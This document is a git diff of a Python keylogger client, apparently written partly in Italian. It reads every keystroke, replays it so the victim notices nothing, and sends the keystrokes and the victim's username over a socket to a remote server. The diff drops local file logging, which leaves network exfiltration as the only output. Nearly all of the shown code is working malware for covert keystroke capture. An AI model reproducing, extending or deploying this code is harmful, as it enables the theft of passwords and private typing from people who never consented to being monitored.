@@ -1,6 +1,5 @@
 from lib import keyboard
 from datetime import datetime
-import os
 import threading
 import getpass
 import socket
@@ -12,12 +11,12 @@ client_socket.sendall(str(getpass.getuser()).encode())
 
 evento = threading.Event()
 
-
 def recording():
     msg = keyboard.read_event(suppress=True)
     l = list()
     l.append(msg)
     keyboard.play(l)
+    
     return msg
 
 def writeToFileRaw(lPath, lName, l):    
@@ -29,7 +28,8 @@ def rispondiServer():
     while evento.is_set() == False:
         client_socket.recv(1024)
 
-def writeToFileHuman(lPath, lName, strh):
+def writeToFileHuman(strh):
+    strh=str(strh)+"\n"
     if strh.find("down") != -1:   
         if strh.find("enter") != -1:
             strh = "\n"
@@ -55,28 +55,17 @@ def writeToFileHuman(lPath, lName, strh):
             thread_write_server.start()
         except:
             evento.set()
-        """
-        newLog = open(lPath + lName, "a")
-        newLog.write(strh)
-        newLog.close()
-        """
 
 def main():
-    tempLogName = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + "_" + getpass.getuser()
-    logsPath = "logs/"
 
     thread_rispondi= threading.Thread(target=rispondiServer)
     thread_rispondi.daemon=True
     thread_rispondi.start()
-    
 
     while evento.is_set() == False:
         tempLog = recording()
-        strh = str(tempLog)
 
-        #thread_write_raw = threading.Thread(target=writeToFileRaw, args=(logsPath,tempLogName+".raw",strh + "\n"))
-        #thread_write_raw.start()
-        thread_write_human = threading.Thread(target=writeToFileHuman, args=(logsPath, tempLogName+".txt", strh + "\n"))
+        thread_write_human = threading.Thread(target=writeToFileHuman, args=(tempLog,))
         thread_write_human.start()
         
 
